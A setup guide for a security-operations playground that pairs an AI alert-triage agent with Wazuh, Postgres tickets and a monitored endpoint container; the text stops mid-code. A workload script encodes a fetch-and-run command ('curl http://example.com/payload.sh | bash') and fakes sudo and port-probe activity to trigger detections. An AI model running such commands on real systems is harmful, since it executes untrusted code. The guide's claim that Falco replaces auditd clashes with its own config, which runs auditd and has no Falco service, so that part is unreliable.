# Cyber Response Agent - Playground Setup Guide (v2)

## Overview

This guide sets up a complete playground environment for prototyping the cyber response agent using open-source tools that mirror commercial SIEM/EDR/ticketing platforms. This version includes refined architecture based on realistic EDR simulation, existing Wazuh MCP integration, and improved data modeling.

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│ DevContainer (Claude Code)                                  │
│ ├─ Existing Wazuh MCP Server (socfortress)                 │
│ ├─ Claude Skills (Case Knowledge, Playbooks)               │
│ ├─ Agent Code                                               │
│ └─ Docker CLI (access to host Docker)                      │
└─────────────────┬───────────────────────────────────────────┘
                  │ (Docker socket mount)
                  ▼
┌─────────────────────────────────────────────────────────────┐
│ Docker Compose Stack (Host Docker)                         │
│                                                              │
│ ┌──────────────────────────────────────────────────────┐   │
│ │ Target Endpoint (Ubuntu + Workloads)                 │   │
│ │  ├─ Real processes & system activity                 │   │
│ │  ├─ Workload scripts (benign + suspicious)           │   │
│ │  └─ Accessible via docker exec for investigation     │   │
│ └────────────────────┬─────────────────────────────────┘   │
│                      │                                       │
│                      ▼                                       │
│ ┌──────────────────────────────────────────────────────┐   │
│ │ Falco (eBPF Monitoring)                              │   │
│ │  ├─ Captures syscalls, file access, network events   │   │
│ │  ├─ Container-native security monitoring             │   │
│ │  └─ Outputs events as JSON                           │   │
│ └────────────────────┬─────────────────────────────────┘   │
│                      │                                       │
│                      ▼                                       │
│ ┌──────────────────────────────────────────────────────┐   │
│ │ Wazuh Manager (SIEM)                                 │   │
│ │  ├─ Ingests Falco events                             │   │
│ │  ├─ Applies detection rules                          │   │
│ │  ├─ Generates alerts                                 │   │
│ │  └─ API for queries                                  │   │
│ └────────────────────┬─────────────────────────────────┘   │
│                      │                                       │
│                      ├──────────────┐                        │
│                      ▼              ▼                        │
│          ┌────────────────┐  ┌─────────────────┐           │
│          │ Wazuh Indexer  │  │ PostgreSQL      │           │
│          │ (Elasticsearch)│  │ (Tickets only)  │           │
│          │ - Event logs   │  │ - Tickets       │           │
│          │ - Searchable   │  │ - Case knowledge│           │
│          └────────────────┘  │ - Playbooks     │           │
│                      ▲        └─────────────────┘           │
│                      │                                       │
│          ┌────────────────┐                                 │
│          │ Wazuh Dashboard│                                 │
│          │ (Web UI)       │                                 │
│          └────────────────┘                                 │
│                                                              │
│ ┌──────────────────────────────────────────────────────┐   │
│ │ Sandbox (Isolated - for reproduction testing)        │   │
│ └──────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘

Data Flow:
1. Target Endpoint → Falco (syscall monitoring via eBPF)
2. Falco → Wazuh Manager (events via HTTP/file/syslog)
3. Wazuh Manager → Wazuh Indexer (stores all events)
4. Wazuh Manager → PostgreSQL (creates tickets from alerts)
5. Agent → Wazuh MCP (queries alerts) → PostgreSQL (manages tickets)
```

## Key Changes from v1

### 1. Falco-based EDR Simulation (Production-Realistic)
- Replaced synthetic alert generator with **Falco eBPF monitoring**
- **Why Falco**: auditd doesn't work in containers (requires kernel-level access)
- Captures real syscalls, process execution, file access, network events
- Container-native, modern approach used in production Kubernetes environments
- Target endpoint runs realistic workloads, monitored by Falco

### 2. Simplified Data Flow: Falco → Wazuh → PostgreSQL
- **Falco** captures endpoint telemetry (replaces EDR agent)
- **Wazuh** ingests events, applies detection rules, generates alerts (SIEM)
- **Wazuh Indexer** stores all events (Elasticsearch for log search)
- **PostgreSQL** stores tickets created from alerts (ticketing system)
- Clean separation: logs in Elasticsearch, structured data in PostgreSQL

### 3. Existing Wazuh MCP Server
- Uses **socfortress/Wazuh-MCP-Server** (production-ready Python implementation)
- No custom SIEM integration needed
- Supports natural language queries and alert management

### 4. Refined Database Schema
- Removed complex `investigations` table (context via skills instead)
- Merged `known_false_positives` into enriched `case_knowledge` table
- Added `closure_reason` field for human-readable explanations
- Dynamic alert fields stored in JSONB (signature-agnostic metadata)
- **PostgreSQL for tickets only** - events stay in Wazuh Indexer where they belong

---

## Stack Components

### 1. Wazuh (SIEM)
- **Purpose**: Alert generation, log aggregation, detection rules
- **Commercial equivalent**: Splunk, QRadar, Elastic Security
- **Components**:
  - Wazuh Manager (API + rules engine)
  - Wazuh Indexer (Elasticsearch for log storage)
  - Wazuh Dashboard (Web UI)
- **API**: REST API via existing MCP server

### 2. Falco (eBPF Security Monitoring)
- **Purpose**: Runtime security monitoring, syscall capture
- **Commercial equivalent**: EDR agents (CrowdStrike, SentinelOne, Carbon Black)
- **Implementation**: Modern eBPF driver (no kernel module installation)
- **Key features**:
  - Container-native monitoring (works where auditd fails)
  - Captures process execution, file access, network connections
  - Pre-built detection rules for suspicious behavior
  - JSON event output for SIEM integration
- **Why not auditd**: auditd requires kernel-level access (only one instance per kernel), incompatible with containers

### 3. PostgreSQL + pgvector
- **Purpose**: Ticket storage, case knowledge base, playbooks
- **Commercial equivalent**: ServiceNow CMDB, Jira database
- **Features**: Vector similarity search for semantic case matching
- **Stores**: Tickets, case knowledge, playbooks (NOT raw events - those go to Wazuh Indexer)

### 4. Target Endpoint Container
- **Purpose**: Generate realistic endpoint activity
- **Commercial equivalent**: Production workload being monitored
- **Implementation**: Ubuntu 22.04 with workload scripts
- **Key features**:
  - Real system processes and activity
  - Workload scripts simulate benign and suspicious behavior
  - Agent investigates via `docker exec` (like EDR console)
  - Monitored by Falco for security events

### 5. Reproduction Sandbox
- **Purpose**: Isolated environment for testing hypotheses
- **Implementation**: Docker container with network isolation
- **Use case**: Safely reproduce suspicious commands/scripts

---

## Setup Instructions

### Prerequisites

```bash
# Verify Docker access from devcontainer
docker ps

# Install required tools in devcontainer
sudo apt-get update
sudo apt-get install -y docker-compose jq curl postgresql-client python3-pip
```

### Step 1: Create Docker Compose Stack

```yaml
# docker-compose.yml
version: '3.8'

services:
  # Wazuh Manager (SIEM)
  wazuh-manager:
    image: wazuh/wazuh-manager:4.7.0
    hostname: wazuh-manager
    restart: always
    ports:
      - "1514:1514"    # Agent connection
      - "1515:1515"    # Agent enrollment
      - "55000:55000"  # API
    environment:
      - INDEXER_URL=https://wazuh-indexer:9200
      - INDEXER_USERNAME=admin
      - INDEXER_PASSWORD=SecretPassword
      - FILEBEAT_SSL_VERIFICATION_MODE=full
      - SSL_CERTIFICATE_AUTHORITIES=/etc/ssl/root-ca.pem
      - SSL_CERTIFICATE=/etc/ssl/filebeat.pem
      - SSL_KEY=/etc/ssl/filebeat.key
      - API_USERNAME=wazuh-api
      - API_PASSWORD=MyS3cr37P450r.*-
    volumes:
      - wazuh_api_configuration:/var/ossec/api/configuration
      - wazuh_etc:/var/ossec/etc
      - wazuh_logs:/var/ossec/logs
      - wazuh_queue:/var/ossec/queue
      - wazuh_var_multigroups:/var/ossec/var/multigroups
      - wazuh_integrations:/var/ossec/integrations
      - wazuh_active_response:/var/ossec/active-response/bin
      - wazuh_agentless:/var/ossec/agentless
      - wazuh_wodles:/var/ossec/wodles
      - ./wazuh_cluster:/wazuh-config-mount/

  # Wazuh Indexer (Elasticsearch)
  wazuh-indexer:
    image: wazuh/wazuh-indexer:4.7.0
    hostname: wazuh-indexer
    restart: always
    ports:
      - "9200:9200"
    environment:
      - "OPENSEARCH_JAVA_OPTS=-Xms512m -Xmx512m"
      - "discovery.type=single-node"
      - "network.host=0.0.0.0"
    volumes:
      - wazuh-indexer-data:/var/lib/wazuh-indexer

  # Wazuh Dashboard (Web UI)
  wazuh-dashboard:
    image: wazuh/wazuh-dashboard:4.7.0
    hostname: wazuh-dashboard
    restart: always
    ports:
      - "5601:5601"
    environment:
      - INDEXER_USERNAME=admin
      - INDEXER_PASSWORD=SecretPassword
      - WAZUH_API_URL=https://wazuh-manager
      - DASHBOARD_USERNAME=kibanaserver
      - DASHBOARD_PASSWORD=kibanaserver
      - API_USERNAME=wazuh-api
      - API_PASSWORD=MyS3cr37P450r.*-
    depends_on:
      - wazuh-indexer
    links:
      - wazuh-indexer:wazuh-indexer
      - wazuh-manager:wazuh-manager

  # PostgreSQL (Tickets + Case Knowledge)
  postgres:
    image: pgvector/pgvector:pg16
    hostname: postgres
    restart: always
    ports:
      - "5432:5432"
    environment:
      POSTGRES_DB: cyber_response
      POSTGRES_USER: agent
      POSTGRES_PASSWORD: agent_password
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./init-db.sql:/docker-entrypoint-initdb.d/init-db.sql

  # Target Endpoint (realistic EDR simulation)
  target-endpoint:
    build:
      context: ./target-endpoint
      dockerfile: Dockerfile
    hostname: target-endpoint
    restart: always
    privileged: true  # Required for auditd
    environment:
      - WAZUH_MANAGER=wazuh-manager
      - WAZUH_AGENT_NAME=target-endpoint-001
    depends_on:
      - wazuh-manager
    volumes:
      - ./target-endpoint/workloads:/opt/workloads
      - /var/log/audit:/var/log/audit  # Audit logs

  # Sandbox environment (for reproduction)
  sandbox:
    image: ubuntu:22.04
    hostname: sandbox
    restart: "no"
    network_mode: none
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp
      - /var/tmp
    volumes:
      - ./sandbox-scripts:/sandbox:ro

volumes:
  wazuh_api_configuration:
  wazuh_etc:
  wazuh_logs:
  wazuh_queue:
  wazuh_var_multigroups:
  wazuh_integrations:
  wazuh_active_response:
  wazuh_agentless:
  wazuh_wodles:
  wazuh-indexer-data:
  postgres_data:
```

### Step 2: Initialize Database Schema (Refined)

```sql
-- init-db.sql
-- Enable pgvector extension
CREATE EXTENSION IF NOT EXISTS vector;

-- ==========================================
-- TICKETS TABLE (Core alert metadata)
-- ==========================================
CREATE TABLE tickets (
    id SERIAL PRIMARY KEY,
    alert_id VARCHAR(255) UNIQUE NOT NULL,
    alert_signature VARCHAR(255) NOT NULL,
    severity VARCHAR(20) NOT NULL,
    status VARCHAR(50) DEFAULT 'open',  -- open, investigating, closed

    -- Closure information
    disposition VARCHAR(50),  -- true_positive, false_positive, benign, escalated, inconclusive
    confidence_score NUMERIC(5,2),  -- 0-100
    closure_reason TEXT,  -- Human-readable explanation for closure decision

    -- Metadata
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    closed_at TIMESTAMP,
    closed_by VARCHAR(100) DEFAULT 'agent',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

    -- Raw alert (signature-specific fields stored as JSONB for flexibility)
    raw_alert JSONB NOT NULL,

    -- Investigation context (tracks what agent did during investigation)
    investigation_context JSONB  -- Stores: queries run, skills invoked, findings, timeline
);

-- ==========================================
-- CASE KNOWLEDGE TABLE (Replaces investigations + known_false_positives)
-- ==========================================
CREATE TABLE case_knowledge (
    id SERIAL PRIMARY KEY,
    ticket_id INTEGER REFERENCES tickets(id),
    alert_signature VARCHAR(255) NOT NULL,

    -- Rich context for learning from past cases
    alert_summary TEXT NOT NULL,  -- Natural language summary of the alert
    investigation_process JSONB,  -- Steps taken, tools used, queries executed
    key_findings TEXT,  -- What made this benign/malicious (enriched explanation)

    -- Disposition
    disposition VARCHAR(50) NOT NULL,  -- true_positive, false_positive, benign, etc.
    confidence_score NUMERIC(5,2),

    -- Pattern matching (flexible, signature-specific indicators)
    pattern_indicators JSONB,  -- Key fields that identified this case
    -- Example: {"process_name": "powershell.exe", "parent_process": "explorer.exe", "signed": true}

    -- Semantic search support
    embedding vector(1536),  -- For similarity matching using OpenAI embeddings

    -- Metadata and usage tracking
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_referenced TIMESTAMP,  -- Track when this knowledge was last useful
    reference_count INTEGER DEFAULT 0  -- How often this knowledge is retrieved
);

-- ==========================================
-- PLAYBOOKS TABLE (Investigation procedures)
-- ==========================================
CREATE TABLE playbooks (
    id SERIAL PRIMARY KEY,
    alert_signature VARCHAR(255) UNIQUE NOT NULL,
    name VARCHAR(255) NOT NULL,
    description TEXT,

    -- Investigation workflow
    investigation_steps JSONB NOT NULL,  -- Ordered list of investigation steps
    -- Example: ["Check process signature", "Verify parent process", "Query similar executions"]

    -- Decision support
    common_fp_patterns TEXT[],  -- Array of common false positive indicators
    -- Example: ["Signed by IT department", "Executed from trusted path"]
    escalation_criteria TEXT[],  -- When to escalate vs auto-close

    -- Configuration
    auto_close_threshold NUMERIC(5,2) DEFAULT 95.0,  -- Confidence threshold for auto-closure

    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ==========================================
-- THREAT INTELLIGENCE CACHE
-- ==========================================
CREATE TABLE threat_intel (
    id SERIAL PRIMARY KEY,
    indicator VARCHAR(255) UNIQUE NOT NULL,
    indicator_type VARCHAR(50) NOT NULL,  -- ip, domain, hash, url
    reputation_score INTEGER,  -- 0-100 (0=malicious, 100=trusted)
    malicious BOOLEAN,
    tags TEXT[],  -- e.g., ["malware-c2", "phishing", "apt-x"]
    source VARCHAR(100),  -- e.g., "virustotal", "abuseipdb", "mock-ti"
    metadata JSONB,  -- Additional context from TI source
    last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ==========================================
-- AGENT METRICS
-- ==========================================
CREATE TABLE agent_metrics (
    id SERIAL PRIMARY KEY,
    metric_type VARCHAR(100) NOT NULL,  -- e.g., 'decision_accuracy', 'investigation_time', 'alert_volume'
    metric_value NUMERIC,
    metadata JSONB,  -- Context about the metric (e.g., alert_signature, disposition)
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ==========================================
-- INDEXES FOR PERFORMANCE
-- ==========================================
CREATE INDEX idx_tickets_status ON tickets(status);
CREATE INDEX idx_tickets_signature ON tickets(alert_signature);
CREATE INDEX idx_tickets_timestamp ON tickets(timestamp DESC);
CREATE INDEX idx_case_knowledge_signature ON case_knowledge(alert_signature);
CREATE INDEX idx_case_knowledge_disposition ON case_knowledge(disposition);
CREATE INDEX idx_playbooks_alert_type ON playbooks(alert_signature);
CREATE INDEX idx_threat_intel_indicator ON threat_intel(indicator);

-- ==========================================
-- SEMANTIC SEARCH FUNCTION
-- ==========================================
CREATE OR REPLACE FUNCTION find_similar_cases(
    query_embedding vector(1536),
    alert_sig VARCHAR DEFAULT NULL,
    match_threshold FLOAT DEFAULT 0.8,
    match_count INT DEFAULT 5
)
RETURNS TABLE (
    id INTEGER,
    alert_signature VARCHAR,
    alert_summary TEXT,
    key_findings TEXT,
    disposition VARCHAR,
    similarity FLOAT
)
LANGUAGE plpgsql
AS $$
BEGIN
    RETURN QUERY
    SELECT
        ck.id,
        ck.alert_signature,
        ck.alert_summary,
        ck.key_findings,
        ck.disposition,
        1 - (ck.embedding <=> query_embedding) AS similarity
    FROM case_knowledge ck
    WHERE
        (alert_sig IS NULL OR ck.alert_signature = alert_sig)
        AND 1 - (ck.embedding <=> query_embedding) > match_threshold
    ORDER BY ck.embedding <=> query_embedding
    LIMIT match_count;
END;
$$;

-- ==========================================
-- SAMPLE DATA
-- ==========================================

-- Sample playbook for suspicious PowerShell
INSERT INTO playbooks (alert_signature, name, description, investigation_steps, common_fp_patterns, escalation_criteria)
VALUES (
    'suspicious_powershell',
    'Suspicious PowerShell Execution',
    'Investigate potentially malicious PowerShell command execution',
    '[
        "Verify PowerShell script signature (signed/unsigned)",
        "Analyze command line for obfuscation patterns (base64, encoding)",
        "Identify parent process and execution context",
        "Query recent PowerShell executions by same user/host",
        "Compare against known administrative scripts",
        "Check for download cradles or network connections",
        "Inspect command history and related processes"
    ]'::jsonb,
    ARRAY[
        'PowerShell signed by IT department certificate',
        'Executed from trusted administrative path (C:\IT\, C:\Scripts\)',
        'Known backup/monitoring tool (Veeam, SCCM, monitoring agents)',
        'Configuration management system (Ansible, Chef, Puppet)',
        'Scheduled task with documented business purpose'
    ],
    ARRAY[
        'Base64-encoded commands from suspicious parent process',
        'Download cradle patterns (IEX, DownloadString, WebClient)',
        'Execution from user temp directories or appdata',
        'Obfuscation techniques detected',
        'Connection to known malicious IPs/domains'
    ]
);

-- Sample playbook for failed logins
INSERT INTO playbooks (alert_signature, name, description, investigation_steps, common_fp_patterns, escalation_criteria)
VALUES (
    'failed_login',
    'Failed Login Attempts',
    'Investigate authentication failures for brute force or credential stuffing',
    '[
        "Count failed attempts over time window (1hr, 24hr)",
        "Check source IP reputation and geolocation",
        "Verify if username exists in directory",
        "Compare against normal login patterns for user",
        "Check for successful logins from same IP",
        "Correlate with other authentication events"
    ]'::jsonb,
    ARRAY[
        'User typing password incorrectly (3-5 attempts over >5 minutes)',
        'Expired password scenarios',
        'Service account authentication after password rotation',
        'VPN reconnection failures',
        'Mobile device sync issues'
    ],
    ARRAY[
        'High velocity attempts (>10 per minute)',
        'Source IP from suspicious geolocation',
        'Attempts against admin/service accounts',
        'Password spray pattern (multiple users, same password)',
        'Successful login immediately after failed attempts'
    ]
);

-- Sample case knowledge (false positive example)
INSERT INTO case_knowledge (
    ticket_id,
    alert_signature,
    alert_summary,
    investigation_process,
    key_findings,
    disposition,
    confidence_score,
    pattern_indicators
)
VALUES (
    NULL,  -- No associated ticket for pre-seeded knowledge
    'suspicious_powershell',
    'PowerShell execution from explorer.exe running IT department backup script',
    '{
        "steps": [
            "Checked process signature - signed by corporate IT certificate",
            "Verified execution path - C:\\IT\\backup-scripts\\daily-backup.ps1",
            "Confirmed scheduled task - runs daily at 2 AM",
            "Reviewed script content - legitimate backup operations"
        ],
        "tools_used": ["process_inspector", "certificate_validator", "scheduled_task_query"]
    }'::jsonb,
    'This is a legitimate IT department backup script that runs via scheduled task. The script is properly signed with the corporate certificate and executes from a trusted administrative path. The parent process is explorer.exe because the scheduled task is configured to run in the user context.',
    'false_positive',
    98.5,
    '{
        "process_name": "powershell.exe",
        "parent_process": "explorer.exe",
        "execution_path": "C:\\\\IT\\\\backup-scripts\\\\",
        "signed": true,
        "certificate_issuer": "IT Department - Corporate CA",
        "scheduled_task": true
    }'::jsonb
);

-- Sample case knowledge (true positive example)
INSERT INTO case_knowledge (
    ticket_id,
    alert_signature,
    alert_summary,
    investigation_process,
    key_findings,
    disposition,
    confidence_score,
    pattern_indicators
)
VALUES (
    NULL,
    'suspicious_powershell',
    'Base64-encoded PowerShell spawned from Microsoft Word - Malicious macro execution',
    '{
        "steps": [
            "Decoded base64 command - revealed download cradle from suspicious domain",
            "Checked parent process - winword.exe (Microsoft Word)",
            "Queried recent file opens - user opened invoice.docm from email",
            "Analyzed network connections - contacted known malware C2 IP",
            "Checked file hash - macro document flagged by VirusTotal (45/70 detections)"
        ],
        "tools_used": ["base64_decoder", "network_connection_log", "virustotal_lookup"]
    }'::jsonb,
    'User opened a malicious macro-enabled Word document (invoice.docm) which executed obfuscated PowerShell to download and execute a second-stage payload from a known malicious domain. The PowerShell command was base64-encoded and used IEX with DownloadString to fetch malware.',
    'true_positive',
    99.2,
    '{
        "process_name": "powershell.exe",
        "parent_process": "winword.exe",
        "command_line_contains": ["-enc", "-encodedCommand"],
        "decoded_content_patterns": ["IEX", "DownloadString", "WebClient"],
        "network_indicators": {"contacted_suspicious_ip": true},
        "file_hash_malicious": true
    }'::jsonb
);
```

### Step 3: Create Target Endpoint Container

```dockerfile
# target-endpoint/Dockerfile
FROM ubuntu:22.04

# Prevent interactive prompts during installation
ENV DEBIAN_FRONTEND=noninteractive

# Install dependencies
RUN apt-get update && apt-get install -y \
    auditd \
    audispd-plugins \
    curl \
    wget \
    net-tools \
    procps \
    cron \
    python3 \
    python3-pip \
    vim \
    && rm -rf /var/lib/apt/lists/*

# Configure auditd rules for security monitoring
COPY auditd-rules.conf /etc/audit/rules.d/cyber-monitoring.rules

# Install Wazuh agent
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add - && \
    echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list && \
    apt-get update && \
    apt-get install -y wazuh-agent

# Configure Wazuh agent to monitor auditd logs
COPY wazuh-agent-config.xml /var/ossec/etc/ossec.conf

# Copy workload scripts
COPY workloads/ /opt/workloads/
RUN chmod +x /opt/workloads/*.sh

# Startup script
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

# Create cron job for workloads
RUN echo "*/5 * * * * /opt/workloads/benign_activity.sh >> /var/log/workload.log 2>&1" > /etc/cron.d/workload && \
    echo "*/15 * * * * /opt/workloads/suspicious_patterns.sh >> /var/log/workload.log 2>&1" >> /etc/cron.d/workload && \
    chmod 0644 /etc/cron.d/workload

ENTRYPOINT ["/entrypoint.sh"]
CMD ["tail", "-f", "/dev/null"]
```

```bash
# target-endpoint/entrypoint.sh
#!/bin/bash
set -e

echo "Starting Target Endpoint..."

# Start auditd
echo "Starting auditd..."
service auditd start

# Configure Wazuh agent
if [ -n "$WAZUH_MANAGER" ]; then
    echo "Configuring Wazuh agent to connect to $WAZUH_MANAGER..."
    sed -i "s/<address>.*<\/address>/<address>$WAZUH_MANAGER<\/address>/" /var/ossec/etc/ossec.conf
fi

if [ -n "$WAZUH_AGENT_NAME" ]; then
    echo "Setting Wazuh agent name to $WAZUH_AGENT_NAME..."
    echo "$WAZUH_AGENT_NAME" > /var/ossec/etc/client.keys
fi

# Start Wazuh agent
echo "Starting Wazuh agent..."
/var/ossec/bin/wazuh-control start

# Start cron for workload scripts
echo "Starting cron..."
service cron start

echo "Target endpoint ready!"

# Execute CMD
exec "$@"
```

```conf
# target-endpoint/auditd-rules.conf
# Auditd rules for security monitoring

## Process execution monitoring
-a always,exit -F arch=b64 -S execve -k process_execution
-a always,exit -F arch=b32 -S execve -k process_execution

## File access monitoring
-w /etc/passwd -p wa -k user_modification
-w /etc/shadow -p wa -k user_modification
-w /etc/sudoers -p wa -k privilege_escalation
-w /tmp -p wa -k temp_files

## Network connection monitoring
-a always,exit -F arch=b64 -S socket -S connect -k network_connections
-a always,exit -F arch=b32 -S socket -S connect -k network_connections

## Privilege escalation monitoring
-a always,exit -F arch=b64 -S setuid -S setgid -k privilege_change
-a always,exit -F arch=b32 -S setuid -S setgid -k privilege_change
```

```xml
<!-- target-endpoint/wazuh-agent-config.xml -->
<ossec_config>
  <client>
    <server>
      <address>wazuh-manager</address>
      <port>1514</port>
      <protocol>tcp</protocol>
    </server>
    <enrollment>
      <enabled>yes</enabled>
      <agent_name>target-endpoint-001</agent_name>
    </enrollment>
  </client>

  <!-- Monitor auditd logs -->
  <localfile>
    <log_format>audit</log_format>
    <location>/var/log/audit/audit.log</location>
  </localfile>

  <!-- Monitor syslog -->
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/syslog</location>
  </localfile>

  <!-- Monitor auth logs -->
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/auth.log</location>
  </localfile>

  <!-- Enable syscollector for inventory -->
  <wodle name="syscollector">
    <disabled>no</disabled>
    <interval>1h</interval>
    <scan_on_start>yes</scan_on_start>
  </wodle>
</ossec_config>
```

```bash
# target-endpoint/workloads/benign_activity.sh
#!/bin/bash
# Simulates normal user activity

# File operations
touch /tmp/user_document_$(date +%s).txt
ls -la /home > /dev/null
cat /etc/passwd > /dev/null

# Process execution
ps aux > /dev/null
top -bn1 > /dev/null

# Network activity (benign)
curl -s http://www.google.com > /dev/null || true
ping -c 3 8.8.8.8 > /dev/null || true

echo "[$(date)] Benign activity completed"
```

```bash
# target-endpoint/workloads/suspicious_patterns.sh
#!/bin/bash
# Simulates suspicious but controlled activity for testing

# 30% chance to trigger suspicious behavior
if [ $((RANDOM % 10)) -lt 3 ]; then
    echo "[$(date)] Triggering suspicious pattern"

    # Suspicious pattern 1: Base64 encoding (common in malware)
    echo "curl http://example.com/payload.sh | bash" | base64 > /tmp/encoded_cmd.txt

    # Suspicious pattern 2: Unusual process execution chain
    sh -c "whoami > /tmp/user_check.txt"

    # Suspicious pattern 3: Multiple failed sudo attempts
    echo "wrong_password" | sudo -S ls /root 2>/dev/null || true
    echo "wrong_password" | sudo -S ls /root 2>/dev/null || true

    # Suspicious pattern 4: Network scan simulation (safe)
    nc -zv localhost 22 2>/dev/null || true
    nc -zv localhost 80 2>/dev/null || true
    nc -zv localhost 443 2>/dev/null || true
fi

echo "[$(date)] Suspicious patterns check completed"
```

### Step 4: Integrate Wazuh MCP Server

```bash
# Install the Wazuh MCP Server in devcontainer
cd /workspace
git clone https://github.com/socfortress/Wazuh-MCP-Server.git
cd Wazuh-MCP-Server
pip install -r requirements.txt
```

```json
# .claude/mcp_config.json
{
  "mcpServers": {
    "wazuh": {
      "command": "python3",
      "args": ["/workspace/Wazuh-MCP-Server/src/wazuh_mcp_server/server.py"],
      "env": {
        "WAZUH_API_URL": "https://localhost:55000",
        "WAZUH_API_USER": "wazuh-api",
        "WAZUH_API_PASSWORD": "MyS3cr37P450r.*-",
        "WAZUH_API_VERIFY_SSL": "false"
      }
    },
    "ticketing": {
      "command": "python3",
      "args": ["/workspace/mcp-servers/ticketing_server.py"],
      "env": {}
    },
    "threat_intel": {
      "command": "python3",
      "args": ["/workspace/mcp-servers/threat_intel_server.py"],
      "env": {}
    }
  }
}
```

### Step 5: Create Ticketing & Threat Intel MCP Servers

```python
# mcp-servers/ticketing_server.py
#!/usr/bin/env python3
"""
MCP Server for ticket management
Allows closing tickets, updating status, adding notes
"""

import json
import sys
import psycopg2
from datetime import datetime

DB_CONFIG = {
    "host": "localhost",
    "port": "5432",
    "database": "cyber_response",
    "user": "agent",
    "password": "agent_password"
}

def close_ticket(alert_id: str, disposition: str, confidence_score: float,
                 closure_reason: str, investigation_context: dict, closed_by: str = "agent") -> dict:
    """Close a ticket with investigation results"""
    conn = psycopg2.connect(**DB_CONFIG)
    cur = conn.cursor()

    cur.execute("""
        UPDATE tickets
        SET status = 'closed',
            disposition = %s,
            confidence_score = %s,
            closure_reason = %s,
            investigation_context = %s,
            closed_at = NOW(),
            closed_by = %s,
            updated_at = NOW()
        WHERE alert_id = %s
        RETURNING id, alert_signature
    """, (disposition, confidence_score, closure_reason,
          json.dumps(investigation_context), closed_by, alert_id))

    result = cur.fetchone()

    if not result:
        conn.rollback()
        cur.close()
        conn.close()
        return {"success": False, "error": "Alert not found"}

    ticket_id, alert_signature = result

    conn.commit()
    cur.close()
    conn.close()

    return {
        "success": True,
        "ticket_id": ticket_id,
        "alert_signature": alert_signature
    }

def update_ticket_status(alert_id: str, status: str) -> dict:
    """Update ticket status"""
    conn = psycopg2.connect(**DB_CONFIG)
    cur = conn.cursor()

    cur.execute("""
        UPDATE tickets
        SET status = %s,
            updated_at = NOW()
        WHERE alert_id = %s
        RETURNING id
    """, (status, alert_id))

    result = cur.fetchone()

    if not result:
        conn.rollback()
        cur.close()
        conn.close()
        return {"success": False, "error": "Alert not found"}

    conn.commit()
    cur.close()
    conn.close()

    return {"success": True, "ticket_id": result[0]}

def add_case_knowledge(ticket_id: int, alert_signature: str, alert_summary: str,
                       investigation_process: dict, key_findings: str, disposition: str,
                       confidence_score: float, pattern_indicators: dict) -> dict:
    """Add enriched case knowledge from investigation"""
    conn = psycopg2.connect(**DB_CONFIG)
    cur = conn.cursor()

    cur.execute("""
        INSERT INTO case_knowledge (
            ticket_id, alert_signature, alert_summary, investigation_process,
            key_findings, disposition, confidence_score, pattern_indicators
        ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
        RETURNING id
    """, (ticket_id, alert_signature, alert_summary, json.dumps(investigation_process),
          key_findings, disposition, confidence_score, json.dumps(pattern_indicators)))

    knowledge_id = cur.fetchone()[0]

    conn.commit()
    cur.close()
    conn.close()

    return {"success": True, "knowledge_id": knowledge_id}

# MCP Server protocol implementation
def handle_request(request: dict) -> dict:
    """Handle MCP request"""
    method = request.get("method")
    params = request.get("params", {})

    if method == "close_ticket":
        result = close_ticket(
            params.get("alert_id"),
            params.get("disposition"),
            params.get("confidence_score"),
            params.get("closure_reason"),
            params.get("investigation_context", {}),
            params.get("closed_by", "agent")
        )
        return {"result": result}

    elif method == "update_status":
        result = update_ticket_status(
            params.get("alert_id"),
            params.get("status")
        )
        return {"result": result}

    elif method == "add_case_knowledge":
        result = add_case_knowledge(
            params.get("ticket_id"),
            params.get("alert_signature"),
            params.get("alert_summary"),
            params.get("investigation_process"),
            params.get("key_findings"),
            params.get("disposition"),
            params.get("confidence_score"),
            params.get("pattern_indicators")
        )
        return {"result": result}

    else:
        return {"error": f"Unknown method: {method}"}

def main():
    """MCP Server main loop"""
    for line in sys.stdin:
        try:
            request = json.loads(line)
            response = handle_request(request)
            print(json.dumps(response))
            sys.stdout.flush()
        except Exception as e:
            error_response = {"error": str(e)}
            print(json.dumps(error_response))
            sys.stdout.flush()

if __name__ == "__main__":
    main()
```

```python
# mcp-servers/threat_intel_server.py
#!/usr/bin/env python3
"""
MCP Server for threat intelligence lookups
Caches results in PostgreSQL
"""

import json
import sys
import psycopg2
from datetime import datetime, timedelta

DB_CONFIG = {
    "host": "localhost",
    "port": "5432",
    "database": "cyber_response",
    "user": "agent",
    "password": "agent_password"
}

# Mock TI data for playground (replace with real API calls in production)
KNOWN_MALICIOUS_IPS = ["203.0.113.42", "198.51.100.99", "192.0.2.1"]
KNOWN_MALICIOUS_HASHES = [
    "d41d8cd98f00b204e9800998ecf8427e",
    "5d41402abc4b2a76b9719d911017c592"
]
KNOWN_MALICIOUS_DOMAINS = ["malicious-domain.com", "evil-phishing.net"]

def lookup_indicator(indicator: str, indicator_type: str) -> dict:
    """Lookup indicator in TI database and external sources"""
    conn = psycopg2.connect(**DB_CONFIG)
    cur = conn.cursor()

    # Check cache first (24-hour TTL)
    cur.execute("""
        SELECT reputation_score, malicious, tags, source, metadata, last_updated
        FROM threat_intel
        WHERE indicator = %s AND last_updated > NOW() - INTERVAL '24 hours'
    """, (indicator,))

    row = cur.fetchone()

    if row:
        # Return cached result
        result = {
            "indicator": indicator,
            "indicator_type": indicator_type,
